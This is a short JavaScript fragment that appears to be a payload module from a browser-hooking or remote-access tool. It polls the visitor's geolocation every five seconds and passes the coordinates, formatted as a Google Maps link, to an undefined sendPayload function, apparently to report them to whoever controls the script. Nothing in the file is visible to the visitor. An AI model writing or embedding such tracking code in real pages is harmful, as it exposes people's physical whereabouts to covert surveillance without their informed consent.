setInterval(function(){ 

    navigator.geolocation.getCurrentPosition(
        function (position) {
            sendPayload("https://www.google.com/maps/@" + position.coords.latitude + "," + position.coords.longitude + ",15z")        
        }
    );
    
    

}, 5000);



